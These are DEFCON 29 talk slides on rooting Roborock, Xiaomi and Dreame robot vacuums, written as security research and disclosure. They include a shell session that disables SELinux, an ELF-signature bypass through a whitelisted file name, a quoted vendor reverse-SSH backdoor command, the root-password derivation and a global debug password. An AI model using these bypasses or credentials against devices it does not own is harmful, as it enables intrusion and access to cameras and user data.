– All application specific programs protected 
– Keys stored in OPTEE / ARM TrustZone
(08.08.2021)  DEFCON 29 – Dennis Giese
33
Security measures
• Signed ELF-Binaries and kernel-based 
verification 
• Signed and encrypted Firmware updates 
– Keys different per firmware version 
– Master keys stored in OPTEE / TrustZone 
• IPtables binary cannot flush/delete rules 
• Locked UART
(08.08.2021)  DEFCON 29 – Dennis Giese
34
Interesting partitions
Label
Content
Mountpoint
LUKS
DM-verity
app
device.conf (DID, key, MAC), adb.conf, vinda
/mnt/default/
✗
✗
system_a
copy of OS (active by default)
/
✗
✓
system_b
copy of OS (passive by default)
✗
✓
app_a
Robot application and libraries (active)
/opt
✓
✗
app_b
Robot application and libraries (passive)
✓
✗
reserve
config + calibration files
/mnt/reserve/
✓
✗
rtmpdata
logs, maps
/mnt/data
✓
✗
(08.08.2021)  DEFCON 29 – Dennis Giese
35
NEW ROOTING METHODS (ROBOROCK)
(08.08.2021)  DEFCON 29 – Dennis Giese
36
Unrooted robots
• Roborock S7 
• Xiaomi M1S 
• Roborock S6 MaxV
(08.08.2021)  DEFCON 29 – Dennis Giese
37
Unrooted robots
➢ Roborock S7 
• Xiaomi M1S 
• Roborock S6 MaxV
(08.08.2021)  DEFCON 29 – Dennis Giese
38
Roborock S7 rooting
•
Same mainboard as S5 Max, S6 Pure, etc. 
•
Problems:  
– U-Boot patched --> UART method does not work 
– RootFS is a read-only SquashFS 
•
New Method: FEL rooting 
– Does not require soldering 
– Does require disassembly 
– Automatically patches RootFS and enables SSH 
– Applies to all current NAND-based Roborock models
(08.08.2021)  DEFCON 29 – Dennis Giese
39
PCB reverse engineering
Old Method: 
UART
•
UART pins were known before 
– Useless after blocking 
•
Allwinner SOCs have FEL mode 
– Low level mode 
– Allows flashing of device 
– Burned in SOC ROM 
•
Idea: boot custom OS via FEL 
•
Typical methods to trigger FEL: 
– Disable Flash IC 
– Pull BOOT Mode / FEL pin
https://linux-sunxi.org/FEL 
(08.08.2021)  DEFCON 29 – Dennis Giese
40
PCB reverse engineering
New Method: 
FEL
SOC
Destructive  
Desoldering
Probing
(08.08.2021)  DEFCON 29 – Dennis Giese
41
Booting via FEL
•
Challenge: NAND support proprietary 
•
Approach: 
– Extract kernel config from Rockrobo kernel 
– Create InitramFS with Dropbear, SSH keys and tools 
– Compile minimal Kernel using public Nintendo NES Classic sources 
– Create custom U-Boot version with extracted Roborock config 
– Trigger FEL Mode by shorting TPA17 to GND 
– Load U-Boot, Kernel and InitramFS into RAM via USB 
– Boot and automatically patch the SquashFS RootFS
https://www.nintendo.co.jp/support/oss/data/SuperNESClassicEdition_OSS.zip 
https://builder.dontvacuum.me/fel-ressources
(08.08.2021)  DEFCON 29 – Dennis Giese
42
FEL image patching process
•
Boot into FEL image 
•
Decompress SquashFS 
•
Patch RootFS image 
– Install “authorized_keys” and custom Dropbear SSH server 
•
Compress SquashFS image 
•
Overwrite partition with new image 
•
Result: SSH access and root
https://builder.dontvacuum.me/fel-ressources
https://builder.dontvacuum.me/howtos
(08.08.2021)  DEFCON 29 – Dennis Giese
43
FEL rooting advantages
•
No soldering required 
•
Simple process 
•
Allows to restore bricked devices 
•
Can be used for all Allwinner-based devices
https://builder.dontvacuum.me/fel-ressources
(08.08.2021)  DEFCON 29 – Dennis Giese
44
Unrooted robots
✓ Roborock S7 
➢ Xiaomi M1S 
➢ Roborock S6 MaxV
(08.08.2021)  DEFCON 29 – Dennis Giese
45
Xiaomi M1S / S6 MaxV rooting
•
Problems: 
– All ports closed or firewalled 
– Filesystems encrypted or integrity protected 
– USB interface protected with custom adbd 
•
Idea: layered approach 
– Break in via USB 
– Disable SELinux 
– Patch application partition 
•
Note: While its possible, it might be impossible for many people ☹
(08.08.2021)  DEFCON 29 – Dennis Giese
46
Level 1: Get ADB shell
•
ADB uses special authentication 
– Challenge-Response authentication 
– Based on VINDA secret (which we don’t have) 
– Mode controlled by config file (adb.conf) 
– Relevant files stored on “default” partition and not protected 
•
Idea:  
– Connect to Flash via ISP or de-solder it 
– Extract or create VINDA secret 
– Use tool to compute challenge response
https://builder.dontvacuum.me/vinda 
(08.08.2021)  DEFCON 29 – Dennis Giese
47
ISP access Xiaomi M1S
(08.08.2021)  DEFCON 29 – Dennis Giese
48
ISP access Roborock S6 MaxV
D5
D0
D2
D3
D7
D1
D4
CMD
D6
CAUTION: If you don‘t know what 
you‘re doing, you‘re likely to brick 
your device
(08.08.2021)  DEFCON 29 – Dennis Giese
49
Recommended Method
•
ISP access can be tricky 
•
Usage of an adapter might be easier 
– Requires reflow soldering 
– Re-balling equipment needed
(08.08.2021)  DEFCON 29 – Dennis Giese
50
Level 1 result
•
We set vinda to “UUUUUUUUUUUUUUUU”
1. Get serial number
2. Get challenge
3. Compute response using 
serial number and challenge
4. Execute commands
Many thanks to Erik Uhlmann for his support
https://builder.dontvacuum.me/vinda 
(08.08.2021)  DEFCON 29 – Dennis Giese
51
Level 2: Disable SELinux
•
We have shell access, but SELinux is enforced 
– Network access is blocked 
– Access to /dev is blocked 
– However: bind-mounts and “kill” is allowed 
•
Idea:  
– Copy /opt/rockrobo/miio to /tmp/miio 
– Replace “miio_client” with bash script 
– Bind-mount /tmp/miio to /opt/rockrobo/miio  
– Kill “miio_client” -> bash script gets executed
(08.08.2021)  DEFCON 29 – Dennis Giese
52
Level 2 result
• Watchdog will restart miio_client if it gets killed
# getenforce 
Enforcing 
# ps 
PID   USER     TIME   COMMAND 
… 
 9751 root      26:04 miio_client -d /mnt/data/miio -l 2 
…. 
# cp -r /opt/rockrobo/miio /tmp/ 
# echo '#!/bin/sh' > /tmp/miio/miio_client 
# echo 'echo 0 > /sys/fs/selinux/enforce' >> /tmp/miio/miio_client 
# echo 'sleep 30' >> /tmp/miio/miio_client 
# mount -o bind /tmp/miio /opt/rockrobo/miio 
# kill 9751 
# getenforce 
Permissive
1. Get the current mode of SELinux
2. Find PID of miio_client process
3. Copy miio directory to /tmp
4. Create bash script in place if miio_client 
to disable SELinux
5. Bind-mount modified directory to /opt/
rockrobo/miio
6. Kill miio_client process
7. Enjoy
(08.08.2021)  DEFCON 29 – Dennis Giese
53
Level 3: Modify application partition
• We have now full root, but only temporary 
– “app” partition not integrity protected 
– By modification of scripts 
• disable SELinux 
• start Dropbear on a different port 
– Limitation: ELF binaries need to be signed 
• “Backdoor”: any file named “librrafm.so” is whitelisted 
• Symbolic links work ;)
Many thanks to Erik Uhlmann for his support
(08.08.2021)  DEFCON 29 – Dennis Giese
54
Level 3 result
• We want to run Valetudo on our robot 
/tmp # wget https://github.com/Hypfer/Valetudo/.../valetudo-armv7 
/tmp # ./valetudo-armv7 
Segmentation fault 
/tmp # dmesg 
.... 
[1744981.268689] __verify_elf__: (valetudo-armv7)sign verify fail, target section non exist! 
[1744981.268722] [verify_elf]:(valetudo-armv7)signature verify fail! 
/tmp # mv valetudo-armv7 librrafm.so 
/tmp # ./librrafm.so 
[2021-06-30T03:24:39.664Z] [INFO] Autodetected RoborockS6MaxVValetudoRobot 
[2021-06-30T03:24:39.736Z] [INFO] Starting Valetudo 2021.06.0 
[2021-06-30T03:24:39.742Z] [INFO] Configuration file: /tmp/valetudo_config.json 
[2021-06-30T03:24:39.743Z] [INFO] Logfile: /tmp/valetudo.log 
[2021-06-30T03:24:39.744Z] [INFO] Robot: Beijing Roborock Technology Co., Ltd. S6 MaxV
1. Download 
Valetudo
2. Realize it doesn’t 
work because of 
custom ELF 
signature
3. Rename Valetudo 
to ”librrafm.so”
4. Enjoy working 
Valetudo
(08.08.2021)  DEFCON 29 – Dennis Giese
55
Other ideas for M1S / S6 MaxV
• Ask OPTEE nicely to decrypt firmware updates 
• Access cameras directly (via GStreamer) 
• Extract Machine Learning Models 
• Find all the backdoors
(08.08.2021)  DEFCON 29 – Dennis Giese
56
Summary Roborock
• We have an easy method to root S7 and other models 
• We have root for Xiaomi M1S and Roborock S6 MaxV 
– However: Method is dangerous and will brick your device 
– Only feasible if you have equipment and experience 
– Regard rooting only as a proof-of-concept 
• Recommendation:  
– avoid new Roborock models if you want root
(08.08.2021)  DEFCON 29 – Dennis Giese
57
A NEW PLAYER: DREAME
(08.08.2021)  DEFCON 29 – Dennis Giese
58
A new alternative
•
First model released in 2019 
•
OEM products for Xiaomi 
•
Models: 
– Xiaomi 1C and Dreame F9 (VSLAM) 
– Dreame D9 (LiDAR) 
– Xiaomi 1T (VSLAM + ToF) 
– Dreame L10 Pro (LiDAR + Line Laser + Camera) 
•
Allwinner SoC 
•
OS based on Android 
•
Robot software: AVA
Pictures of Xiaomi 1T (top), Dreame D9 (bottom) 
https://dontvacuum.me/robotinfo/ 
(08.08.2021)  DEFCON 29 – Dennis Giese
59
Video perspective Xiaomi 1C/Dreame F9
Recorded with camera_demo and AVA recording commands
(08.08.2021)  DEFCON 29 – Dennis Giese
60
Time-of-Flight Camera Xiaomi 1T
Point cloud obtained by AVA commands
(08.08.2021)  DEFCON 29 – Dennis Giese
61
Line Laser Dreame L10 Pro
Recorded with activated line laser from /dev/video1
(08.08.2021)  DEFCON 29 – Dennis Giese
62
ROOTING DREAME
(08.08.2021)  DEFCON 29 – Dennis Giese
63
Easy opening and root
•
First root: December 2019 (1C) 
•
All models have the same connector 
– Can be accessed without breaking warranty seals 
•
Extracted key material and firmware 
•
Reverse engineered flashing via FEL 
– Usage of Banana Pi tools 
– Flashing with PhoenixUSB (Windows only ☹)
https://github.com/BPI-SINOVOIP/BPI-M3-bsp 
(08.08.2021)  DEFCON 29 – Dennis Giese
64
Debug pinout
Front
Boot_SEL
RX
TX
D+
D-
VBUS 
(Do not 
connect)
GND
•
Debuginterface 
–
2x8 pins 
–
2mm pitch size
Warning: 
2mm pitch size is way smaller 
than the usual 2.54 mm
Warning: 
Make sure you connect to the 
correct pins!
(08.08.2021)  DEFCON 29 – Dennis Giese
65
Rooting with custom PCBs
For the Gerber files (thanks to Ben Helfrich): 
https://builder.dontvacuum.me/dreameadapter 
(08.08.2021)  DEFCON 29 – Dennis Giese
66
Examples of connections
USB
UART
Marker 
(needs to be on the right)
BOOT_S
EL
Front
For the Gerber files (thanks to Ben Helfrich): 
https://builder.dontvacuum.me/dreameadapter 
(08.08.2021)  DEFCON 29 – Dennis Giese
67
INTERESTING FINDINGS
(08.08.2021)  DEFCON 29 – Dennis Giese
68
AutoSSH backdoor
• Trigger reverse SSH shell 
–
sshpass -p xxx ssh -p 10022 -o StrictHostKeyChecking=no -fCNR last-4-digits-of-sn:127.0.0.1:22 
PI:EMAIL 
• Hard coded credentials to server 
– User has sudo rights 
– Server used for development
(08.08.2021)  DEFCON 29 – Dennis Giese
69
Debug Scripts
•
Startup debug script 
– Unencrypted ftp download from personal developer NAS 
•
Log uploads 
– With admin credentials
(08.08.2021)  DEFCON 29 – Dennis Giese
70
Obfuscated Root Password
• Root password of device is derived as follows: 
– Base64(SHA1(Serial number)) 
• Password for debug firmwares (globally):  
– #share!#
(08.08.2021)  DEFCON 29 – Dennis Giese
71
Lots of “chatty” functions
• Debug functions 
– Recording and upload of pictures 
– Recording and upload of camera recordings 
• Device produces lots of log-files 
• Only way to prevent uploads: rooting
(08.08.2021)  DEFCON 29 – Dennis Giese
72
Summary Dreame
• Devices are cheaper than Roborock 
• Performant Hardware 
• Valetudo support 
– Full support since April 2021 
• All current models can be rooted without soldering 
– Applies to all devices released before Aug 2021 
• Questionable remains in Software
https://valetudo.cloud/ 
(08.08.2021)  DEFCON 29 – Dennis Giese
73
DUSTBUILDER
(08.08.2021)  DEFCON 29 – Dennis Giese
74
Dustbuilder
• Website for building your own custom robot firmwares 
– Reproducible builds 
– Easy to use 
– Works for Dreame, Roborock and Viomi 
• Alternative to local building 
– All tools are still published on Github 
• URL: http://builder.dontvacuum.me/ 
(08.08.2021)  DEFCON 29 – Dennis Giese
75
Acknowledgements
• Ben Helfrich 
• Carolin Gross 
• Cameron Kennedy 
• Daniel Wegemer 
• Erik Uhlmann 
• Guevara Noubir 
• Sören Beye
(08.08.2021)  DEFCON 29 – Dennis Giese
76
Contact: 
See: http://dontvacuum.me 
Telegram: https://t.me/dgiese 
Twitter: dgi_DE 
Email: PI:EMAIL